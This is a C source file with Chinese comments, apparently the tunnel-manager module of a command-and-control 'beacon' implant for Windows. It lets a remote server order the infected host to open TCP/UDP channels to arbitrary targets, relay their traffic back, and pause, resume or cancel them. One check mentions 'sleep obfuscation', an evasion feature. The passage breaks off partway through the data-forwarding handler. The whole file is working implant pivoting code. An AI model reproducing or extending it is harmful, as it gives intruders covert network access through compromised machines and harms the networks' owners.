/*
 * tunnel_server.c - 隧道管理器生命周期、通道管理、工作线程、命令处理
 *
 * 持有 TunnelManager 的全部状态：通道链表、待发送控制/数据队列、
 * 工作线程，以及 start/control/data/close 四类入站命令的入口。
 * 帧编解码与拨号分别在 tunnel_frame.c 和 tunnel_client.c 中实现。
 */
#include "beacon_tunnel_internal.h"

#include <process.h>

#define TUNNEL_TCP_READ_BUFFER_SIZE (16 * 1024)
#define TUNNEL_UDP_READ_BUFFER_SIZE (32 * 1024)
#define TUNNEL_READ_POLL_MS 10
#define TUNNEL_HARVEST_WAIT_MS 10
#define TUNNEL_HARVEST_BULK_BYTES (64 * 1024)
#define TUNNEL_UDP_IDLE_MS 15000
#define TUNNEL_MAX_IDLE_MS (5 * 60 * 1000)

/* 阶段 2：per-channel 数据队列与公平轮询 */
#define TUNNEL_CHANNEL_QUEUE_MAX 256            /* 每通道数据队列上限（包，≈4MB），满时 worker 阻塞背压 */
#define TUNNEL_POLL_CHANNEL_MAX_PACKETS 64      /* 每通道每轮排空上限（包，≈1MB） */
#define TUNNEL_POLL_BATCH_MAX_BYTES (1024 * 1024) /* 单次回传总字节上限（大通道不独占整批） */

/*
 * 隧道管理器维护 TCP/UDP 通道、待发送控制包和待发送数据包。
 * start/control/data/close 命令都在这里归一化成 channel 状态变更。
 */

typedef struct TunnelCloseNotice {
    CHAR tunnel_id[128];
    CHAR channel_id[128];
    INT reason;
} TunnelCloseNotice;

/* 持锁时按 tunnel_id + channel_id 查找通道 */
static TunnelChannel* TunnelFindLocked(TunnelManager* tm, const CHAR* tunnel_id, const CHAR* channel_id)
{
    TunnelChannel* ch;
    for (ch = tm->channels; ch; ch = ch->next) {
        if (!ch->done &&
            strcmp(ch->tunnel_id, tunnel_id ? tunnel_id : "") == 0 &&
            strcmp(ch->channel_id, channel_id ? channel_id : "") == 0) {
            return ch;
        }
    }
    return NULL;
}

/* 按 job_id 查找通道（需持锁） */
static TunnelChannel* TunnelFindJobLocked(TunnelManager* tm, UINT32 job_id)
{
    TunnelChannel* ch;
    for (ch = tm->channels; ch; ch = ch->next) {
        if (!ch->done && ch->job_id == job_id) {
            return ch;
        }
    }
    return NULL;
}

/* 释放通道数据队列中的残留数据包（持有锁时调用） */
static VOID TunnelFreeChannelQueueLocked(TunnelManager* tm, TunnelChannel* ch)
{
    TunnelPendingPacket* node = ch->data_head;
    while (node) {
        TunnelPendingPacket* next = node->next;
        BbFree(&node->packet);
        HeapFree(GetProcessHeap(), 0, node);
        node = next;
    }
    if (ch->data_count > 0 && tm) {
        tm->data_count -= ch->data_count;
    }
    ch->data_head = NULL;
    ch->data_tail = NULL;
    ch->data_count = 0;
}

/*
 * 跨线程请求关闭通道：仅置 closed 标志并唤醒等待者，绝不触碰 socket_handle。
 *
 * socket 生命周期归属 worker 线程：worker 在无锁状态下对 socket_handle 执行
 * select/recv/send，而 Winsock 对“并发 closesocket 与进行中的 select/recv/send”
 * 未定义行为（句柄可能被新套接字复用，导致监视/读写错连甚至崩溃）。因此
 * 主循环侧的一切关闭诉求都必须走本函数，由 worker 在自己的回收路径中调用
 * TunnelCloseSocket 真正关闭。closed 置位后 worker 的 select 轮询（≤10ms）
 * 和队列满等待（被 WakeAll 唤醒）都会及时观察到标志并退出。
 */
static VOID TunnelRequestClose(TunnelChannel* ch)
{
    if (InterlockedCompareExchange(&ch->closed, 1, 0) == 0) {
        WakeAllConditionVariable(&ch->data_cv);
    }
}

/*
 * 真正关闭并断开通道套接字（幂等）。
 * 所有权约束：只能由通道 owner 线程调用——即 worker 线程自身的清理路径、
 * 或已确认对应线程不再访问 socket 的场合（线程创建失败、TunnelFree 已等待
 * 全部线程退出之后的兜底）。不得在 worker 存活期间从其它线程调用。
 */
static VOID TunnelCloseSocket(TunnelChannel* ch)
{
    SOCKET s;
    if (!ch) {
        return;
    }
    if (InterlockedCompareExchange(&ch->closed, 1, 0) == 0) {
        s = ch->socket_handle;
        if (s != INVALID_SOCKET) {
            shutdown(s, SD_BOTH);
            closesocket(s);
            ch->socket_handle = INVALID_SOCKET;
        }
        /* 唤醒可能阻塞在队列满等待中的 worker（per-channel 背压） */
        WakeAllConditionVariable(&ch->data_cv);
    }
}

/* 将数据包推入有界队列，容量满时丢弃最旧的 */
static VOID TunnelPushBounded(TunnelPendingPacket** head, TunnelPendingPacket** tail, SIZE_T* count,
                                SIZE_T limit, ByteBuf packet, const CHAR* queue_name)
{
    TunnelPendingPacket* node;

    if (packet.len == 0) {
        BbFree(&packet);
        return;
    }

    /* 容量满时丢弃最旧的数据包 */
    while (*count >= limit && *head) {
        TunnelPendingPacket* old = *head;
        *head = old->next;
        if (!*head) {
            *tail = NULL;
        }
        --(*count);
        DebugPrintf("[tunnel] drop oldest %s remaining=%lu\n",
                    queue_name ? queue_name : "?", (ULONG)*count);
        BbFree(&old->packet);
        HeapFree(GetProcessHeap(), 0, old);
    }

    /* 分配并入队新节点 */
    node = (TunnelPendingPacket*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*node));
    if (!node) {
        BbFree(&packet);
        return;
    }
    node->packet = packet;
    if (*tail) {
        (*tail)->next = node;
    } else {
        *head = node;
    }
    *tail = node;
    ++(*count);
}

/* 将控制数据包推入控制队列（线程安全） */
static VOID TunnelPushControlPacket(TunnelManager* tm, ByteBuf packet)
{
    EnterCriticalSection(&tm->lock);
    TunnelPushBounded(&tm->control_head, &tm->control_tail, &tm->control_count,
                      TUNNEL_MAX_CONTROL_PACKETS, packet, "control");
    LeaveCriticalSection(&tm->lock);
}

/* 将数据包推入通道数据队列（worker 线程调用）。
 * per-channel 有界队列：满时阻塞等待主循环排空（背压传导到目标 socket，
 * TCP 窗口自然限速），不再全局丢最旧；通道已关闭时丢弃本次数据包。 */
static VOID TunnelPushDataPacket(TunnelManager* tm, const CHAR* tunnel_id, const CHAR* channel_id,
                                   ByteBuf packet)
{
    TunnelChannel* ch;
    TunnelPendingPacket* node;

    if (packet.len == 0) {
        BbFree(&packet);
        return;
    }

    EnterCriticalSection(&tm->lock);
    ch = TunnelFindLocked(tm, tunnel_id, channel_id);
    if (!ch || ch->closed) {
        LeaveCriticalSection(&tm->lock);
        BbFree(&packet);
        return;
    }
    while (!ch->closed && ch->data_count >= TUNNEL_CHANNEL_QUEUE_MAX) {
        SleepConditionVariableCS(&ch->data_cv, &tm->lock, INFINITE);
    }
    if (ch->closed) {
        LeaveCriticalSection(&tm->lock);
        BbFree(&packet);
        return;
    }
    node = (TunnelPendingPacket*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*node));
    if (!node) {
        LeaveCriticalSection(&tm->lock);
        BbFree(&packet);
        return;
    }
    node->packet = packet;
    if (ch->data_tail) {
        ch->data_tail->next = node;
    } else {
        ch->data_head = node;
    }
    ch->data_tail = node;
    ++ch->data_count;
    ++tm->data_count;
    LeaveCriticalSection(&tm->lock);
}

/* 构建并入队隧道控制数据包 */
static VOID TunnelSendControlPacket(TunnelManager* tm, const CHAR* tunnel_id, const CHAR* channel_id,
                                       const CHAR* action, INT reason)
{
    ByteBuf payload;
    ByteBuf final_packet;

    DebugPrintf("[tunnel] control %s/%s %s reason=%d\n",
                tunnel_id ? tunnel_id : "", channel_id ? channel_id : "",
                action ? action : "", reason);
    payload = TunnelPackControl(tunnel_id, channel_id, action, reason);
    final_packet = PacketMakeFinal(0, BEACON_COMMAND_TUNNEL_CONTROL, &payload);
    BbFree(&payload);
    TunnelPushControlPacket(tm, final_packet);
}

/* 构建并入队隧道启动确认数据包 */
static VOID TunnelSendStartAck(TunnelManager* tm, const TunnelStartRequest* req)
{
    ByteBuf payload;
    ByteBuf final_packet;

    DebugPrintf("[tunnel] start-ack %s/%s\n",
                req && req->tunnel_id ? req->tunnel_id : "",
                req && req->channel_id ? req->channel_id : "");
    payload = TunnelPackStart(req);
    final_packet = PacketMakeFinal(0, BEACON_COMMAND_TUNNEL_START, &payload);
    BbFree(&payload);
    TunnelPushControlPacket(tm, final_packet);
}

/* 构建并入队隧道数据包 */
static VOID TunnelSendDataPacket(TunnelManager* tm, const CHAR* tunnel_id, const CHAR* channel_id,
                                    const BYTE8* data, SIZE_T len)
{
    ByteBuf payload = TunnelPackData(tunnel_id, channel_id, data, len);
    ByteBuf final_packet = PacketMakeFinal(0, BEACON_COMMAND_TUNNEL_DATA, &payload);
    BbFree(&payload);
    TunnelPushDataPacket(tm, tunnel_id, channel_id, final_packet);
}

/* 向管理器添加通道（线程安全）。返回原因码 */
static INT TunnelManagerAdd(TunnelManager* tm, TunnelChannel* ch)
{
    INT result = TUNNEL_REASON_NONE;
    EnterCriticalSection(&tm->lock);

    /* 检查容量和重复 */
    if (tm->channel_count >= TUNNEL_MAX_CHANNELS) {
        result = TUNNEL_REASON_QUEUE_FULL;
    } else if (TunnelFindLocked(tm, ch->tunnel_id, ch->channel_id)) {
        result = TUNNEL_REASON_DUPLICATE_CHANNEL;
    } else {
        ch->next = tm->channels;
        tm->channels = ch;
        ++tm->channel_count;
    }
    LeaveCriticalSection(&tm->lock);
    return result;
}

/* 工作线程：在独立线程内完成 dial + StartAck + 数据读取循环。
 * 主循环只负责解析请求、注册 pending channel 并启动本线程，不会被 connect 阻塞。 */
static UINT __stdcall TunnelWorker(VOID* param)
{
    TunnelChannel* ch = (TunnelChannel*)param;
    TunnelManager* tm = ch->owner;
    struct BeaconContext* ctx = tm->ctx;
    TunnelStartRequest req;
    BYTE8* buffer;
    INT buf_size;
    SOCKET s;
    INT reason;

    /* 1. 在 worker 线程内拨号连接目标（DNS + TCP connect，可能耗时数秒）。
     *    主循环不再被此阻塞，N 个 START 任务 = N 个 worker 并行 dial。 */
    ZeroMemory(&req, sizeof(req));
    req.mode = ch->mode;
    req.tunnel_id = ch->tunnel_id;
    req.channel_id = ch->channel_id;
    req.proto = ch->proto;
    req.target = ch->target;
    req.connect_timeout_ms = ch->connect_timeout_ms;

    s = TunnelDialTarget(&req, &reason);
    if (s == INVALID_SOCKET) {
        /* 连接失败：通知 server 关闭 channel */
        TunnelSendControlPacket(tm, ch->tunnel_id, ch->channel_id, "close", reason);
        RuntimeActivityEnd(ctx);
        TunnelCloseSocket(ch);
        InterlockedExchange(&ch->done, 1);
        return 0;
    }

    /* 2. 连接成功：记录 socket 并清除 connecting 标记 */
    EnterCriticalSection(&tm->lock);
    ch->socket_handle = s;
    InterlockedExchange(&ch->connecting, 0);
    if (ch->closed) {
        /* 在 dial 期间已被 close 命令取消 */
        LeaveCriticalSection(&tm->lock);
        TunnelCloseSocket(ch);
        InterlockedExchange(&ch->done, 1);
        return 0;
    }
    LeaveCriticalSection(&tm->lock);

    /* 3. 发送启动确认（StartAck）给 server */
    TunnelSendStartAck(tm, &req);

    /* 4. 进入数据读取循环 */
    buf_size = strcmp(ch->proto, "udp") == 0 ? TUNNEL_UDP_READ_BUFFER_SIZE : TUNNEL_TCP_READ_BUFFER_SIZE;
    buffer = (BYTE8*)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)buf_size);
    if (!buffer) {
        TunnelSendControlPacket(tm, ch->tunnel_id, ch->channel_id, "close", TUNNEL_REASON_UNKNOWN);
        TunnelCloseSocket(ch);
        InterlockedExchange(&ch->done, 1);
        return 0;
    }

    while (!InterlockedCompareExchange(&ch->closed, 0, 0)) {
        fd_set read_set;
        TIMEVAL tv;
        INT sel;
        INT n;

        /* 暂停时跳过读取 */
        if (InterlockedCompareExchange(&ch->paused, 0, 0)) {
            Sleep(100);
            continue;
        }

        /* 轮询套接字可读性 */
        FD_ZERO(&read_set);
        FD_SET(ch->socket_handle, &read_set);
        tv.tv_sec = 0;
        tv.tv_usec = TUNNEL_READ_POLL_MS * 1000;
        sel = select(0, &read_set, NULL, NULL, &tv);
        if (sel == 0) {
            /* 超时：检查 UDP 空闲限制 */
            if (strcmp(ch->proto, "udp") == 0 && GetTickCount64() - ch->last_seen > TUNNEL_UDP_IDLE_MS) {
                TunnelSendControlPacket(tm, ch->tunnel_id, ch->channel_id, "close", TUNNEL_REASON_TIMEOUT);
                break;
            }
            continue;
        }
        if (sel == SOCKET_ERROR) {
            if (!InterlockedCompareExchange(&ch->closed, 0, 0)) {
                TunnelSendControlPacket(tm, ch->tunnel_id, ch->channel_id, "close",
                                           TunnelWsaReason(WSAGetLastError()));
            }
            break;
        }

        /* 从套接字读取数据 */
        n = recv(ch->socket_handle, (CHAR*)buffer, buf_size, 0);
        if (n > 0) {
            ch->bytes_out += (UINT64)n;
            ch->last_seen = GetTickCount64();
            TunnelSendDataPacket(tm, ch->tunnel_id, ch->channel_id, buffer, (SIZE_T)n);
            /* UDP 当前按单次请求/响应语义处理，收到一次响应后关闭通道。 */
            if (strcmp(ch->proto, "udp") == 0) {
                break;
            }
            continue;
        }
        if (n == 0) {
            /* 对端正常关闭 */
            if (!InterlockedCompareExchange(&ch->closed, 0, 0)) {
                TunnelSendControlPacket(tm, ch->tunnel_id, ch->channel_id, "close",
                                           TUNNEL_REASON_PEER_CLOSED);
            }
            break;
        }
        /* 读取错误 */
        if (!InterlockedCompareExchange(&ch->closed, 0, 0)) {
            TunnelSendControlPacket(tm, ch->tunnel_id, ch->channel_id, "close",
                                       TunnelWsaReason(WSAGetLastError()));
        }
        break;
    }

    /* 清理 */
    HeapFree(GetProcessHeap(), 0, buffer);
    TunnelCloseSocket(ch);
    InterlockedExchange(&ch->done, 1);
    return 0;
}

/* 移除并释放已完成工作线程的通道 */
static VOID TunnelCleanupDone(TunnelManager* tm)
{
    TunnelChannel** pp;
    EnterCriticalSection(&tm->lock);
    pp = &tm->channels;
    while (*pp) {
        TunnelChannel* ch = *pp;
        if (InterlockedCompareExchange(&ch->done, 0, 0)) {
            *pp = ch->next;
            --tm->channel_count;
            if (tm->poll_rotate == ch) {
                tm->poll_rotate = ch->next; /* 游标指向被删节点的后继，保持轮转连续性 */
            }
            if (ch->thread_handle) {
                CloseHandle(ch->thread_handle);
            }
            if (tm->ctx) RuntimeActivityEnd(tm->ctx);
            TunnelFreeChannelQueueLocked(tm, ch);
            SecureZeroMemory(ch, sizeof(*ch));
            HeapFree(GetProcessHeap(), 0, ch);
            continue;
        }
        pp = &(*pp)->next;
    }
    LeaveCriticalSection(&tm->lock);
}

VOID TunnelCleanupDoneForTest(TunnelManager* tm)
{
    TunnelCleanupDone(tm);
}

/* 关闭超过最大空闲时间的通道 */
static VOID TunnelCleanupExpired(TunnelManager* tm)
{
    TunnelCloseNotice notices[TUNNEL_MAX_CHANNELS];
    SIZE_T notice_count = 0;
    ULONGLONG now = GetTickCount64();
    TunnelChannel* ch;

    /* 持锁查找过期通道 */
    EnterCriticalSection(&tm->lock);
    for (ch = tm->channels; ch && notice_count < TUNNEL_MAX_CHANNELS; ch = ch->next) {
        if (!ch->done && !ch->closed && now - ch->last_seen > TUNNEL_MAX_IDLE_MS) {
            strcpy_s(notices[notice_count].tunnel_id, sizeof(notices[notice_count].tunnel_id), ch->tunnel_id);
            strcpy_s(notices[notice_count].channel_id, sizeof(notices[notice_count].channel_id), ch->channel_id);
            notices[notice_count].reason = TUNNEL_REASON_TIMEOUT;
            ++notice_count;
            TunnelRequestClose(ch);
        }
    }
    LeaveCriticalSection(&tm->lock);

    /* 在锁外发送关闭通知 */
    for (SIZE_T i = 0; i < notice_count; ++i) {
        TunnelSendControlPacket(tm, notices[i].tunnel_id, notices[i].channel_id, "close", notices[i].reason);
    }
}

VOID TunnelInit(TunnelManager* tm, BeaconContext* ctx)
{
    ZeroMemory(tm, sizeof(*tm));
    tm->ctx = ctx;
    InitializeCriticalSection(&tm->lock);
}

VOID TunnelHarvestWait(TunnelManager* tm)
{
    LONG bytes;
    LONG started;
    SIZE_T queued;

    if (!tm) {
        return;
    }

    bytes = InterlockedExchange(&tm->wrote_bytes, 0);
    started = InterlockedExchange(&tm->pending_start, 0);
    if (!started && bytes <= 0) {
        return;
    }
    if (!started && bytes > (LONG)TUNNEL_HARVEST_BULK_BYTES) {
        DebugPrintf("[tunnel] harvest skip bulk bytes=%ld\n", bytes);
        return;
    }

    EnterCriticalSection(&tm->lock);
    queued = tm->data_count + tm->control_count;
    LeaveCriticalSection(&tm->lock);
    if (queued > 0) {
        return;
    }

    /* 让 worker 有机会 recv/入队；不做事件同步，避免额外内核对象。 */
    SwitchToThread();
    Sleep(TUNNEL_HARVEST_WAIT_MS);
    DebugPrintf("[tunnel] harvest wait %ums bytes=%ld start=%ld\n",
                TUNNEL_HARVEST_WAIT_MS, bytes, started);
}

/* 关闭所有通道，等待线程，并释放所有资源 */
VOID TunnelFree(TunnelManager* tm)
{
    TunnelChannel* ch;
    TunnelPendingPacket* node;

    /* 请求所有通道关闭（只置标志；closesocket 由各 worker 自己执行，
     * 避免与 worker 正在进行的 select/recv/send 并发） */
    EnterCriticalSection(&tm->lock);
    for (ch = tm->channels; ch; ch = ch->next) {
        TunnelRequestClose(ch);
    }
    LeaveCriticalSection(&tm->lock);

    /* 等待所有工作线程完成 */
    for (;;) {
        INT remaining = 0;
        EnterCriticalSection(&tm->lock);
        for (ch = tm->channels; ch; ch = ch->next) {
            if (ch->thread_handle) {
                ++remaining;
                LeaveCriticalSection(&tm->lock);
                WaitForSingleObject(ch->thread_handle, INFINITE);
                EnterCriticalSection(&tm->lock);
                break;
            }
        }
        LeaveCriticalSection(&tm->lock);
        TunnelCleanupDone(tm);
        if (remaining == 0) {
            break;
        }
    }

    /* 释放剩余的通道结构体。
     * 此时所有线程均已退出，socket 已无持有者，可安全兜底关闭
     * （覆盖 worker 创建失败 / 未及 enter 读循环即退出等残余场景）。 */
    while (tm->channels) {
        ch = tm->channels;
        tm->channels = ch->next;
        if (ch->socket_handle != INVALID_SOCKET) {
            shutdown(ch->socket_handle, SD_BOTH);
            closesocket(ch->socket_handle);
            ch->socket_handle = INVALID_SOCKET;
        }
        if (ch->thread_handle) {
            CloseHandle(ch->thread_handle);
        }
        if (tm->ctx) RuntimeActivityEnd(tm->ctx);
        TunnelFreeChannelQueueLocked(tm, ch);
        SecureZeroMemory(ch, sizeof(*ch));
        HeapFree(GetProcessHeap(), 0, ch);
    }

    /* 释放控制数据包队列 */
    node = tm->control_head;
    while (node) {
        TunnelPendingPacket* next = node->next;
        BbFree(&node->packet);
        HeapFree(GetProcessHeap(), 0, node);
        node = next;
    }

    DeleteCriticalSection(&tm->lock);
    ZeroMemory(tm, sizeof(*tm));
}

/* 按 job_id 取消隧道通道任务 */
BOOL TunnelCancelJob(BeaconContext* ctx, UINT32 job_id, ByteBuf* out)
{
    TunnelManager* tm;
    TunnelChannel* ch;
    CHAR tunnel_id[128] = { 0 };
    CHAR channel_id[128] = { 0 };
    BOOL found = FALSE;

    if (!ctx || !out) return FALSE;
    tm = &ctx->tunnels;

    EnterCriticalSection(&tm->lock);
    ch = TunnelFindJobLocked(tm, job_id);
    if (ch) {
        strcpy_s(tunnel_id, sizeof(tunnel_id), ch->tunnel_id);
        strcpy_s(channel_id, sizeof(channel_id), ch->channel_id);
        InterlockedExchange(&ch->canceled_by_job, 1);
        TunnelRequestClose(ch);
        found = TRUE;
    }
    LeaveCriticalSection(&tm->lock);

    if (found) {
        TunnelSendControlPacket(tm, tunnel_id, channel_id, "close", TUNNEL_REASON_CANCELED);
        BbPrintf(out, "tunnel job %lu canceled", (ULONG)job_id);
    }
    return found;
}

/* 轮询隧道管理器：清理过期/已完成的通道，返回待处理数据包。
 * 数据包按通道公平轮询排空：每通道每轮最多 TUNNEL_POLL_CHANNEL_MAX_PACKETS 包，
 * 单次回传总量不超过 TUNNEL_POLL_BATCH_MAX_BYTES，避免大通道独占整批回传。
 * poll_rotate 记录下一 tick 的起始通道，实现跨 tick 轮转公平。 */
PacketList TunnelPoll(TunnelManager* tm)
{
    PacketList out;
    TunnelPendingPacket* node;
    TunnelChannel* ch;
    SIZE_T total_bytes = 0;

    TunnelCleanupExpired(tm);
    TunnelCleanupDone(tm);

    PlistInit(&out);
    out.items_are_final = 1;

    /* 排空控制数据包队列（全量，控制面量小） */
    EnterCriticalSection(&tm->lock);
    node = tm->control_head;
    while (node) {
        TunnelPendingPacket* next = node->next;
        PlistAdd(&out, node->packet);
        BbInit(&node->packet);
        HeapFree(GetProcessHeap(), 0, node);
        node = next;
    }
    tm->control_head = NULL;
    tm->control_tail = NULL;
    tm->control_count = 0;

    /* 数据队列：按通道公平轮询排空 */
    if (tm->data_count > 0) {
        TunnelChannel* start = tm->poll_rotate;
        TunnelChannel* last_served = NULL;
        INT pass;

        /* 校验轮询游标仍存在（通道可能已被清理） */
        if (start) {
            BOOL found = FALSE;
            for (ch = tm->channels; ch; ch = ch->next) {
                if (ch == start) {
                    found = TRUE;
                    break;
                }
            }
            if (!found) {
                start = NULL;
            }
        }

        for (pass = 0; pass < 2 && total_bytes < TUNNEL_POLL_BATCH_MAX_BYTES; ++pass) {
            TunnelChannel* begin = (pass == 0) ? (start ? start : tm->channels) : tm->channels;
            BOOL progress = FALSE;

            for (ch = begin; ch; ch = ch->next) {
                SIZE_T popped = 0;

                /* 第二圈绕回游标即完成（已覆盖 head..start 之前） */
                if (pass == 1 && start && ch == start) {
                    break;
                }
                /* 已关闭/已完成通道的数据直接丢弃（对端已不可达） */
                if (ch->done || ch->closed) {
                    TunnelFreeChannelQueueLocked(tm, ch);
                    continue;
                }
                while (ch->data_count > 0 && popped < TUNNEL_POLL_CHANNEL_MAX_PACKETS &&
                       total_bytes < TUNNEL_POLL_BATCH_MAX_BYTES) {
                    TunnelPendingPacket* p = ch->data_head;
                    ch->data_head = p->next;
                    if (!ch->data_head) {
                        ch->data_tail = NULL;
                    }
                    --ch->data_count;
                    --tm->data_count;
                    total_bytes += p->packet.len;
                    PlistAdd(&out, p->packet);
                    BbInit(&p->packet);
                    HeapFree(GetProcessHeap(), 0, p);
                    ++popped;
                }
                if (popped > 0) {
                    progress = TRUE;
                    last_served = ch;
                }
                if (total_bytes >= TUNNEL_POLL_BATCH_MAX_BYTES) {
                    break;
                }
            }

            /* 唤醒满队列阻塞的 worker（排空释放了空间） */
            for (ch = tm->channels; ch; ch = ch->next) {
                WakeAllConditionVariable(&ch->data_cv);
            }

            if (!progress || total_bytes >= TUNNEL_POLL_BATCH_MAX_BYTES || !start) {
                break;
            }
        }

        /* 轮转播种（无条件）：下一 tick 从本 tick 最后服务的通道之后开始。
         * 游标为 NULL 等价于“从表头开始”，因此预算截断时必须保证游标非 NULL，
         * 否则积压通道永远位于表头时后续通道将饥饿。 */
        tm->poll_rotate = NULL;
        if (last_served) {
            tm->poll_rotate = last_served->next;
        }
    }
    LeaveCriticalSection(&tm->lock);
    return out;
}

/* 将所有活动隧道通道追加到作业列表输出 */
VOID TunnelAppendJobs(TunnelManager* tm, ByteBuf* out, SIZE_T* count, ULONGLONG now)
{
    TunnelChannel* ch;
    (VOID)now;

    if (!tm || !out || !count) return;

    EnterCriticalSection(&tm->lock);
    for (ch = tm->channels; ch; ch = ch->next) {
        CHAR ref[260];
        CHAR detail[560];
        ULONGLONG age = ch->created_at ? (GetTickCount64() - ch->created_at) / 1000 : 0;
        const CHAR* state = (InterlockedCompareExchange(&ch->closed, 0, 0) ||
                             InterlockedCompareExchange(&ch->canceled_by_job, 0, 0)) ?
                             "stopping" : "running";

        if (InterlockedCompareExchange(&ch->done, 0, 0)) {
            continue;
        }
        snprintf(ref, sizeof(ref), "%s/%s", ch->tunnel_id, ch->channel_id);
        snprintf(detail, sizeof(detail), "%s %s", ch->proto, ch->target);
        BbPrintf(out, "%-10lu  %-10s  %-10s  %-9I64u  %-9lu  %-10s  %-18s  %s\n",
                 (ULONG)ch->job_id,
                 "tunnel",
                 state,
                 (unsigned __int64)age,
                 (ULONG)BEACON_COMMAND_TUNNEL_START,
                 "tunnel",
                 ref[0] ? ref : "-",
                 detail[0] ? detail : "-");
        ++(*count);
    }
    LeaveCriticalSection(&tm->lock);
}

/* 处理隧道启动请求：解析、注册 pending channel、启动 worker 线程。
 * connect 和 StartAck 都在 worker 线程内完成，主循环不被 dial 阻塞。 */
PacketList TunnelHandleStart(BeaconContext* ctx, UINT32 task_id, Parser* parser)
{
    TunnelManager* tm = &ctx->tunnels;
    TunnelStartRequest req;
    TunnelChannel* ch;
    CHAR error[160];
    uintptr_t thread_id;

    /* 解析并验证请求 */
    if (!TunnelParseStart(parser, &req, error, sizeof(error))) {
        return TunnelTextResult(error);
    }

    if (!RuntimeActivityBegin(ctx)) {
        TunnelFreeStart(&req);
        return TunnelTextResult("tunnel blocked while sleep obfuscation is active");
    }

    /* 分配通道结构体（pending 状态，socket 尚未连接） */
    ch = (TunnelChannel*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*ch));
    if (!ch) {
        RuntimeActivityEnd(ctx);
        TunnelFreeStart(&req);
        return TunnelEmptyList();
    }

    /* 从请求填充通道信息（socket_handle = INVALID_SOCKET，connecting = 1） */
    ch->job_id = task_id;
    strcpy_s(ch->tunnel_id, sizeof(ch->tunnel_id), req.tunnel_id);
    strcpy_s(ch->channel_id, sizeof(ch->channel_id), req.channel_id);
    strcpy_s(ch->mode, sizeof(ch->mode), req.mode);
    strcpy_s(ch->proto, sizeof(ch->proto), req.proto);
    strcpy_s(ch->target, sizeof(ch->target), req.target);
    ch->connect_timeout_ms = req.connect_timeout_ms;
    ch->socket_handle = INVALID_SOCKET;
    ch->owner = tm;
    ch->created_at = GetTickCount64();
    ch->last_seen = ch->created_at;
    InterlockedExchange(&ch->connecting, 1);
    InitializeConditionVariable(&ch->data_cv);

    /* 向管理器注册通道 */
    if (TunnelManagerAdd(tm, ch) != TUNNEL_REASON_NONE) {
        RuntimeActivityEnd(ctx);
        SecureZeroMemory(ch, sizeof(*ch));
        HeapFree(GetProcessHeap(), 0, ch);
        TunnelFreeStart(&req);
        return TunnelEmptyList();
    }

    /* 创建工作线程：dial + StartAck + 数据读取都在 worker 内完成。
     * 主循环立即返回，不被 connect 阻塞。 */
    ch->thread_handle = (HANDLE)_beginthreadex(NULL, 0, TunnelWorker, ch, 0, (UINT*)&thread_id);
    if (!ch->thread_handle) {
        /* 线程创建失败：从管理器移除并通知 server 关闭 */
        InterlockedExchange(&ch->connecting, 0);
        TunnelCloseSocket(ch);
        InterlockedExchange(&ch->done, 1);
        TunnelSendControlPacket(tm, req.tunnel_id, req.channel_id, "close", TUNNEL_REASON_UNKNOWN);
        TunnelFreeStart(&req);
        return TunnelEmptyList();
    }

    InterlockedExchange(&tm->pending_start, 1);
    DebugPrintf("[tunnel] start %s/%s proto=%s target=%s\n",
                ch->tunnel_id, ch->channel_id, ch->proto, ch->target);
    TunnelFreeStart(&req);
    return TunnelEmptyList();
}

/* 处理隧道控制请求：暂停、恢复或关闭通道 */
PacketList TunnelHandleControl(TunnelManager* tm, Parser* parser, const CHAR* action_override)
{
    TunnelControlRequest req;
    TunnelChannel* ch;
    CHAR error[160];
    const CHAR* action;

    /* 解析并验证请求 */
    if (!TunnelParseControl(parser, &req, action_override, error, sizeof(error))) {
        return TunnelTextResult(error);
    }
    action = req.action ? req.action : "";

    /* 查找目标通道 */
    EnterCriticalSection(&tm->lock);
    ch = TunnelFindLocked(tm, req.tunnel_id, req.channel_id);
    if (!ch) {
        LeaveCriticalSection(&tm->lock);
        snprintf(error, sizeof(error), "channel %s not found", req.channel_id ? req.channel_id : "");
        TunnelFreeControl(&req);
        return TunnelTextResult(error);
    }

    /* 执行请求的操作 */
    if (strcmp(action, "pause") == 0) {
        InterlockedExchange(&ch->paused, 1);
    } else if (strcmp(action, "resume") == 0) {
        InterlockedExchange(&ch->paused, 0);
    } else if (strcmp(action, "close") == 0) {
        TunnelRequestClose(ch);
    } else {
        LeaveCriticalSection(&tm->lock);
        snprintf(error, sizeof(error), "unknown tunnel action: %s", action);
        TunnelFreeControl(&req);
        return TunnelTextResult(error);
    }
    LeaveCriticalSection(&tm->lock);

    /* 发送控制确认 */
    TunnelSendControlPacket(tm, req.tunnel_id, req.channel_id, action, TUNNEL_REASON_NONE);
    TunnelFreeControl(&req);
    return TunnelEmptyList();
}

/* 处理隧道数据请求：将数据转发到通道套接字 */
PacketList TunnelHandleData(TunnelManager* tm, Parser* parser)
{
    TunnelDataRequest req;
    TunnelChannel* ch;
    SOCKET s;
    CHAR tunnel_id[128];
    CHAR channel_id[128];
    CHAR error[160];

    /* 解析请求 */
    if (!TunnelParseData(parser, &req, error, sizeof(error))) {
        return TunnelTextResult(error);
    }

    /* 查找通道并复制标识符 */
    EnterCriticalSection(&tm->lock);
    ch = TunnelFindLocked(tm, req.tunnel_id, req.channel_id);
    if (!ch || ch->closed) {
        LeaveCriticalSection(&tm->lock);
        TunnelFreeData(&req);
        return TunnelEmptyList();
    }
    /* worker 线程仍在 dial，socket 尚未就绪：丢弃本轮数据，等 worker 连通后再传 */
    if (InterlockedCompareExchange(&ch->connecting, 0, 0)) {
        LeaveCriticalSection(&tm->lock);
        TunnelFreeData(&req);
        return TunnelEmptyList();
    }
    s = ch->socket_handle;
    strcpy_s(tunnel_id, sizeof(tunnel_id), ch->tunnel_id);
    strcpy_s(channel_id, sizeof(channel_id), ch->channel_id);
    LeaveCriticalSection(&tm->lock);

    /* 将数据发送到套接字 */
    if (req.data.len > 0 && !TunnelSendAll(s, req.data.data, req.data.len)) {
        INT reason = TunnelWsaReason(WSAGetLastError());
        EnterCriticalSection(&tm->lock);
        ch = TunnelFindLocked(tm, tunnel_id, channel_id);
        if (ch) {
            TunnelRequestClose(ch);
        }
        LeaveCriticalSection(&tm->lock);
        TunnelSendControlPacket(tm, tunnel_id, channel_id, "close", reason);
    } else if (req.data.len > 0) {
        LONG add;
        /* 更新通道活动统计 */
        EnterCriticalSection(&tm->lock);
